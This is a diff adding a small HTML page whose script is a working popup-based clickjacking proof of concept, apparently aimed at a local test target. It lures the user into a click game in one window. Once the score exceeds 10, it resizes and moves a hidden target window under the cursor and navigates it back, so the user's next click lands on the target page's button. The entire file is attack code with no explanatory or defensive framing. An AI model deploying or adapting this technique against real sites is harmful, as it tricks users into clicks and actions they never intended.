@@ -1,0 +1,30 @@
+<script>
+  const clickOffset = [54, 41]; // From top-left of frame to button
+
+  const targetWindow = window.open("http://localhost:8000/target.html", "", `left=0,top=0,width=${screen.width},height=${screen.height}`);
+  if (targetWindow === null) {
+    alert("Please allow popups for this site");
+  }
+  let clickWindow;
+  setTimeout(() => {
+    clickWindow = window.open("/click.html", "", `left=0,top=0,width=${screen.width},height=${screen.height}`);
+
+    clickWindow.addEventListener("click", (e) => {
+      const { clientX, clientY } = e;
+
+      if (Number(clickWindow.score.innerText) > 10) {
+        clickWindow.close();
+        targetWindow.location = clickWindow.location;
+
+        setTimeout(() => {
+          targetWindow.resizeTo(300, 200);
+          targetWindow.moveTo(clientX - clickOffset[0], clientY - clickOffset[1]);
+          targetWindow.history.back();
+          setTimeout(() => {
+            targetWindow.close();
+          }, 2000);
+        }, 100);
+      }
+    });
+  }, 0);
+</script>
